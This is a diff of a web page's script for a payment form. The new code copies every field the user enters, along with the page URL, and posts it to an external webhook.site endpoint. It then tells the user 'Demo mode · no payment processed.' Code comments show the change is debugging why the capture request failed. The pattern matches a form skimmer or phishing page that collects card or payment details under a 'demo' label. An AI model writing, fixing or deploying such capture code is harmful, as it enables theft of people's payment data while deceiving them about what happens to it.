@@ -381,45 +381,47 @@
   </div>
 
   <script>
-    // ============================================
-    // PAYMENT FORM — DEMO SUBMIT + WEBHOOK CAPTURE
-    // ============================================
-    (function () {
-      const WEBHOOK_URL = 'https://webhook.site/7183fae2-e91b-4d21-a97e-4d5c6a3163e5';
-      const form = document.getElementById('paymentForm');
+(function () {
+  const WEBHOOK_URL = 'https://webhook.site/7183fae2-e91b-4d21-a97e-4d5c6a3163e5';
+  const form = document.getElementById('paymentForm');
+  if (!form) { console.warn('Form not found'); return; }
 
-      if (!form) {
-        console.warn('Form not found — check the selector.');
-        return;
-      }
+  form.addEventListener('submit', async function (event) {
+    event.preventDefault();
 
-      form.addEventListener('submit', async function (event) {
-        event.preventDefault();
+    const payload = Object.fromEntries(new FormData(form).entries());
+    payload.submittedAt = new Date().toISOString();
+    payload.pageUrl = location.href;
 
-        // 1. Build payload from all named fields
-        const formData = new FormData(form);
-        const payload = Object.fromEntries(formData.entries());
-        payload.submittedAt = new Date().toISOString();
-        payload.pageUrl = window.location.href;
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 8000);
 
-        // 2. Send to webhook FIRST (before any blocking alert)
-        try {
-          const response = await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            mode: 'cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          });
-          console.log('Webhook status:', response.status);
-        } catch (err) {
-          console.error('Webhook error:', err);
-        }
-
-        // 3. THEN show the demo message
-        alert('Demo mode · no payment processed.\nService fee: $0.17');
-        form.reset();
+    try {
+      const res = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        mode: 'cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        signal: controller.signal
       });
-    })();
-  </script>
-  </body>
+      clearTimeout(timeout);
+
+      if (!res.ok) {
+        // fetch resolves on 4xx/5xx — this is the check you were missing
+        console.error('Webhook returned non-OK:', res.status, res.statusText);
+      } else {
+        console.log('Webhook OK:', res.status);
+      }
+    } catch (err) {
+      clearTimeout(timeout);
+      // AbortError = timeout; TypeError = CORS/network failure (the OPTIONS-only case)
+      console.error('Webhook failed:', err.name, err.message);
+    }
+
+    alert('Demo mode · no payment processed.');
+    form.reset();
+  });
+})();
+</script>
+</body>
 </html>
